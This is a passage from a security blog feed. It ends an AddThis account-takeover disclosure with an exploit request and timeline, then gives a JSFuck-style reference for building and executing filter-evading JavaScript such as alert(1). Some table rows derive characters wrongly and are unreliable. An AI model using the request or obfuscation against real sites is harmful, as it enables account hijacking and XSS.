&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;err&quot;&gt;pub:ra-538ce0c960e04da4      // (User_X) ra-5438e922313abc3a =&amp;gt; (User_Y) ra-538ce0c960e04da4&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;template:_default&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[enabled]:true&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[title]:Follow&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[size]:large&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[orientation]:vertical&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[elements]:.addthis_vertical_follow_toolbox&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[id]:flwv&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][0][id]:pwned&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][0][service]:facebook&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][0][svc]:facebook&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][0][name]:Facebook&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][0][url]:http://www.facebook.com/pwned&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][1][id]:pwned&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][1][service]:twitter&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][1][svc]:twitter&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][1][name]:Twitter&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][1][url]:http://twitter.com/intent/follow?source=followbutton&amp;amp;variant=1.0&amp;amp;screen_name=pwned&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][2][id]:pwned&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][2][service]:linkedin&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][2][svc]:linkedin&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][2][name]:LinkedIn&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;widget[services][2][url]:http://www.linkedin.com/in/pwned&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Now &lt;strong&gt;User_X&lt;/strong&gt; receive a &lt;code&gt;201 response&lt;/code&gt;.&lt;br /&gt;
While in, the &lt;strong&gt;User_Y&lt;/strong&gt; website plugin data get updated with &lt;strong&gt;pwned&lt;/strong&gt; property value setted by &lt;strong&gt;User_X&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Note that, a malicious user can perform any request through vulnerable user pub property id value.&lt;br /&gt;
In addition, the website &lt;strong&gt;Addthis.com is devoid largely&lt;/strong&gt; of controls &lt;strong&gt;CSRF&lt;/strong&gt; for this reason there’s no proof of concept, It is really clear..&lt;/p&gt;

&lt;h3 id=&quot;example-video-scenario-using-addthis-boost-create-widget-method&quot;&gt;Example video scenario using Addthis “/boost-create-widget” method&lt;/h3&gt;

&lt;div class=&quot;photo_frame_center&quot;&gt;
	&lt;video width=&quot;480&quot; height=&quot;360&quot; controls=&quot;&quot;&gt;
		Sorry, your browser doesn&#39;t support embedded videos, 
		but don&#39;t worry, you can &lt;a href=&quot;/video/security/responsible-disclosure/addthis-vulnerability.ogv&quot;&gt;Download It&lt;/a&gt;
		and watch it with your favorite video player!
		&lt;source src=&quot;/video/security/responsible-disclosure/addthis-vulnerability.ogv&quot; type=&quot;video/ogg; codecs=&amp;quot;theora, vorbis&amp;quot;&quot; /&gt;
	&lt;/video&gt;
&lt;/div&gt;

&lt;p&gt;Watch in &lt;a href=&quot;https://www.youtube.com/watch?v=RRkDVY97D88&quot; class=&quot;lighter-red&quot; title=&quot;How I&#39;m able to take control of any Addthis.com user account!&quot; target=&quot;_blank&quot;&gt;YouTube&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;10/10/2014&lt;/strong&gt; – Report to Addthis Support&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;13/10/2014&lt;/strong&gt; – Received a response from Addthis Support&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;14/10/2014&lt;/strong&gt; – Reply from Addthis that informs me that the bug was fixed&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;14/10/2014&lt;/strong&gt; – Public disclosure&lt;/li&gt;
&lt;/ul&gt;
</description>
				<pubDate>Sat, 11 Oct 2014 12:04:22 +0200</pubDate>
				<link>http://deftcode.ninja/post/how-im-able-to-take-control-of-any-addthis-com-account/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/how-im-able-to-take-control-of-any-addthis-com-account/</guid>
				
				
				<category>responsible-disclosure</category>
				
			</item>
		
			<item>
				<title>Non Alphanumeric Javascript Coding - Quick Reference</title>
				<description>&lt;p&gt;This is a quick reference to generate a fully non-alphanumeric javascript code! &lt;/p&gt;

&lt;h2 id=&quot;base-knowledge&quot;&gt;#1 Base knowledge&lt;/h2&gt;

&lt;h3 id=&quot;generating-numbers&quot;&gt;Generating numbers&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Number&lt;/th&gt;
      &lt;th&gt;Non-Alphanumeric&lt;/th&gt;
      &lt;th&gt;Return string by */+[]&lt;/th&gt;
      &lt;th&gt;Other way through increment&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[]*[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;+!+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;++[[]][+[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;!+[]+!+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;++[++[[]][+[]]][+[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;++[!![]][+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;!+[]+!+[]+!+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;++[++[++[[]][+[]]][+[]]][+[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;++[++[!![]][+[]]][+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;!+[]+!+[]+!+[]+!+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;++[++[++[++[[]][+[]]][+[]]][+[]]][+[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;++[++[++[!![]][+[]]][+[]]][+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;generate-statements&quot;&gt;Generate statements&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Statement&lt;/th&gt;
      &lt;th&gt;Non-Alphanumeric&lt;/th&gt;
      &lt;th&gt;Return string through +[]&lt;/th&gt;
      &lt;th&gt;Other way through +’’&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;[object, Object]&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;{}&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;{}+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;{}+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;false&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[![]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[![]]+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[![]]+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;true&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[!![]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[!![]]+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[!![]]+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;NaN&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[![]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[![]]+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[![]]+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;undefined&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[][&#39;&#39;]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[][&#39;&#39;]+[]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;[][&#39;&#39;]+&#39;&#39;&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;generate-a-simple-non-alphanumeric-string&quot;&gt;#2 Generate a simple non-alphanumeric string&lt;/h2&gt;

&lt;h3 id=&quot;how-to-generate-a-simple-alert-string&quot;&gt;How to generate a simple “alert” string&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Char index&lt;/th&gt;
      &lt;th&gt;Return char&lt;/th&gt;
      &lt;th&gt;Non-Alphanumeric&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[1]&lt;/td&gt;
      &lt;td&gt;‘a’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [+!+[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;JS statement char of “false” array index 1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[2]&lt;/td&gt;
      &lt;td&gt;‘l’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;JS statement char of “false” array index 2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[4]&lt;/td&gt;
      &lt;td&gt;‘e’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;JS statement char of “false” array index 4&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“true”[1]&lt;/td&gt;
      &lt;td&gt;‘r’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;JS statement char of “true” array index 1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“true”[0]&lt;/td&gt;
      &lt;td&gt;‘t’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([!![]]+[]) [[]*[]]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;JS statement char of “true” array index 0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;Concatenate and store non-alphanumeric “alert” to the variable _&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[[]][&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&quot;types-of-execution-methods&quot;&gt;#3 Types of execution methods&lt;/h2&gt;

&lt;h3 id=&quot;how-to-execute-alert1-through-root-object-pointer-or-other-possible-methods&quot;&gt;How to execute “alert(1)” through root Object, Pointer or other possible methods&lt;/h3&gt;

&lt;p&gt;Remember that we have previously generate the “alert” string and we have stored It to _ variable.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Function call&lt;/th&gt;
      &lt;th&gt;Function prototype&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;window[_](++[[]][+[]]);&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;window[&#39;function_name&#39;](arguments)&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Call through the [object Window] (Represents an open window in a browser)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;this[_](++[[]][+[]]);&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;this[&#39;function_name&#39;](arguments)&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Call through the global environment refers to the [object Window]&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;eval(_)(++[[]][+[]]);&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;eval[&#39;function_name&#39;](arguments)&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Interprets arbitrary javascript statements (Dangerous function)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;var x = new Function(_+&#39;(&#39;+(+!+[])+&#39;)&#39;); x();&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;Function(&#39;function_name(arguments)&#39;)&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Another possible way to execute “alert(1)” (not a full non-alphanumeric)&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;how-to-execute-with-constructorconstructor&quot;&gt;How to execute with “[].constructor.constructor”&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Constructor property / Constructor function call&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;[].constructor&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Array’s constructor property returns an array’s constructor function for an object - function Array() { [native code] } - ([].constructor === Array) = true&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;[].constructor.constructor&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Array’s constructor property returns constructor Function - function Function() { [native code] } - ([].constructor.constructor === Function) = true&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;[].constructor.constructor(&quot;function_name&quot;)()&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Constructor function that create a function object&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;[].constructor.constructor(&quot;funct(x)&quot;)()&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Return funct(x) { } by Function object&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code&gt;[].constructor.constructor(&quot;alert(0)&quot;)()&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Return alert(0) - we have already generated the string “alert” so we need to generate the remaining part “(0)”&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;generate-non-alphanumeric-constructorconstructor-by-js-statements&quot;&gt;Generate non-alphanumeric “[].constructor.constructor by JS statements”&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Char index&lt;/th&gt;
      &lt;th&gt;Return char&lt;/th&gt;
      &lt;th&gt;Non-Alphanumeric&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“[object Object]”[5]&lt;/td&gt;
      &lt;td&gt;‘c’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;({}+[])     [!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“[object Object]”[1]&lt;/td&gt;
      &lt;td&gt;‘o’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;({}+[])     [+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“undefined”[1]&lt;/td&gt;
      &lt;td&gt;‘n’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([][&#39;&#39;]+[]) [+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“false”[3]&lt;/td&gt;
      &lt;td&gt;’s’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([![]]+[])  [!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“true”[0]&lt;/td&gt;
      &lt;td&gt;‘t’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([!![]]+[]) [+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“true”[1]&lt;/td&gt;
      &lt;td&gt;‘r’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([!![]]+[]) [+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“undefined”[0]&lt;/td&gt;
      &lt;td&gt;‘u’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([!![]]+[]) [!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“[object Object]”[5]&lt;/td&gt;
      &lt;td&gt;‘c’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;({}+[])     [!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“true”[0]&lt;/td&gt;
      &lt;td&gt;‘t’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([!![]]+[]) [+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“[object Object]”[1]&lt;/td&gt;
      &lt;td&gt;‘o’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;({}+[])     [+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“true”[1]&lt;/td&gt;
      &lt;td&gt;‘r’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([!![]]+[]) [+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;generate-parenthesis-with-argument-0-using-sort-then-concat-it-to-previous-generated-string-alert-stored-in-variable-&quot;&gt;Generate parenthesis with argument “0” using sort(), then concat It to previous generated string “alert” stored in variable _&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Constructor property&lt;/th&gt;
      &lt;th&gt;Return string&lt;/th&gt;
      &lt;th&gt;Non-Alphanumeric&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;[].sort&lt;/td&gt;
      &lt;td&gt;function sort() { [native code] }&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([] [([![]]+[])[++[++[!![]][+[]]][+[]]] + ({}+[])[+!+[]] + ([!![]]+[]) [+!+[]] + ([!![]]+[])[+[]]])&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;[].sort&lt;/td&gt;
      &lt;td&gt;“function sort() { [native code] }”&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([] [([![]]+[])[++[++[!![]][+[]]][+[]]] + ({}+[])[+!+[]] + ([!![]]+[]) [+!+[]] + ([!![]]+[])[+[]]]+[])&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;String char index&lt;/th&gt;
      &lt;th&gt;Return char&lt;/th&gt;
      &lt;th&gt;Non-Alphanumeric&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;“function sort() { [native code] }”[12]&lt;/td&gt;
      &lt;td&gt;’)’&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([] [([![]]+[])[++[++[!![]][+[]]][+[]]] + ({}+[])[+!+[]] + ([!![]]+[]) [+!+[]] + ([!![]]+[])[+[]]]+[]) [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;“function sort() { [native code] }”[13]&lt;/td&gt;
      &lt;td&gt;’(‘&lt;/td&gt;
      &lt;td&gt;&lt;code&gt;([] [([![]]+[])[++[++[!![]][+[]]][+[]]] + ({}+[])[+!+[]] + ([!![]]+[]) [+!+[]] + ([!![]]+[])[+[]]]+[]) [!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;strong&gt;Now concat the string “alert” in the variable _ with “(0)”&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;nx&quot;&gt;_p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]][&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]][&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;({}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+!+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span 